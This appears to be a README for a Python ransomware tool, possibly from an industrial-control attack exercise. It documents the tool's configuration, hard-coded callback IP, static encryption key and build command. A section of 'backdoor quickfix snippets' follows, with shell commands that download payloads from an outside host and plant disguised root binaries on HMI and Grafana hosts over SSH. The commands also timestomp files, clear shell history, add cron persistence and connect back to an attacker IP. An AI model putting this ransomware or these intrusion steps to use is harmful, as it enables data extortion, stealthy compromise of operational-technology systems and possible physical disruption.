# Ransomware
The ransomware encrypts all files found in target_dirs with a static aes key. Before encryption the key is sent via network to tcp://host:port, if the server is unreachable then encprytion is triggered after 10 seconds of timeout. After encryption is done, a message pops up. For this the current user and X sessions are evaluated via who.

If no X-Server is found there are some exceptions.

## Distribution to victims
Attacker 1 hosts the compiled ransomware in the apache path: /var/www/html.

The ransomware variable need to be edited so that the host vaiable points to attacker 0. A ncat listener will be available on port 80 to get the keys from the victims.

## Variables
Please configure this varialbes within __main__.py

```
live=True
target_root='/'
host = '240.64.78.32'
port = 80
target_dirs = ['/home/manuel/Downloads/test',
]
```

## Key
The key (rkey) is static and sent in Caesar chiffre (10) to the server. You can find the static key as rkey in the source code.

The key used for encrpytion doing Caesar twice ... c(c(k, 10), 13) the real key "1a5b201y65c06x9x5799zz2xbcb77137" after the double chifre.


## Messages & GUI
Messages are planted on disk in every encrypted folder. You can edit them: start_encrypt -> message. The pictures and text for the fullscreen message are also editable under mainwindow -> photo_code, mainwindow -> message".

You can find a decrypt tool as well, which currently only supports gui.

## Static compile
```
pyinstaller -F -n ransomware --clean -y -p . ransomware/__main__.py
```
install "apt install libxcb-image0" as well.


## Backdoor quickfix snippets
```
#---- X SESSION OT 
#curl http://240.70.26.128:80/stopthepump -o  /home/ait/stopthepump2

cd /opt/ot_attack
. /opt/ot_attack/config
#mv /home/ait/stopthepump2 /opt/ot_attack/irabalance
scp -o "StrictHostKeyChecking=no" -i hmi-ssh.key /opt/ot_attack/irabalance apdias@$LAPTOP_IP:/tmp/irabalance
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key apdias@$LAPTOP_IP

sudo -i
mv /tmp/irabalance /usr/sbin/irabalance
chmod +x /usr/sbin/irabalance
chown root.root /usr/sbin/irabalance
touch -a -m -t 202012180130.09 /usr/sbin/irabalance
unset HISTFILE
unset HISTFILESIZE
echo "10 13 * * *   root    /usr/sbin/irabalance 127.0.0.1" >> /etc/cron.d/popularity-contest
touch -a -m -t 202012180130.09 /etc/cron.d/popularity-contest

/usr/sbin/irabalance 240.64.78.32
exit
unset HISTFILE
unset HISTFILESIZE
cat /etc/cron.d/popularity-contest
exit

#----
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key apdias@$LAPTOP_IP
unset HISTFILE
unset HISTFILESIZE
cat /etc/cron.d/popularity-contest
ls -al /usr/sbin/irabalance
exit



/var/lib influxdb  grafana




#---- 

curl http://240.70.26.128:80/stopthepumpnox -o  /home/ait/stopthepump 

cd /opt/ot_attack
. /opt/ot_attack/config
mv /home/ait/stopthepump /opt/ot_attack/ircbalance
scp -o "StrictHostKeyChecking=no" -i hmi-ssh.key /opt/ot_attack/ircbalance apdias@$HMI_IP:/tmp/ircbalance
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key apdias@$HMI_IP

sudo -i
systemctl stop docker.service
mv /tmp/ircbalance /usr/sbin/ircbalance
chmod +x /usr/sbin/ircbalance
chown root.root /usr/sbin/ircbalance
touch -a -m -t 202012180130.09 /usr/sbin/ircbalance
unset HISTFILE
unset HISTFILESIZE
echo "10 13 * * *   root    /usr/sbin/ircbalance 127.0.0.1" >> /etc/cron.d/popularity-contest
touch -a -m -t 202012180130.09 /etc/cron.d/popularity-contest
/usr/sbin/ircbalance 240.64.78.32 &

exit
unset HISTFILE
unset HISTFILESIZE
cat /etc/cron.d/popularity-contest
exit

#---
#curl http://240.70.26.128:80/stopthepumpnox -o  /home/ait/stopthepump 

cd /opt/ot_attack
. /opt/ot_attack/config
#mv /home/ait/stopthepump /opt/ot_attack/ircbalance
scp -o "StrictHostKeyChecking=no" -i hmi-ssh.key /opt/ot_attack/ircbalance apdias@$GRAFANA_IP:/tmp/ircbalance
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key apdias@$GRAFANA_IP

sudo -i
mv /tmp/ircbalance /usr/sbin/ircbalance
chmod +x /usr/sbin/ircbalance
chown root.root /usr/sbin/ircbalance
touch -a -m -t 202012180130.09 /usr/sbin/ircbalance
unset HISTFILE
unset HISTFILESIZE
echo "10 13 * * *   root    /usr/sbin/ircbalance 127.0.0.1" >> /etc/cron.d/popularity-contest
touch -a -m -t 202012180130.09 /etc/cron.d/popularity-contest
/usr/sbin/ircbalance 240.64.78.32 &

exit
unset HISTFILE
unset HISTFILESIZE
cat /etc/cron.d/popularity-contest
exit


ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key apdias@$HMI_IP sudo systemctl restart PulseSecure.service
ssh -o "StrictHostKeyChecking=no" -i hmi-ssh.key apdias@$GRAFANA_IP sudo systemctl restart PulseSecure.service

```
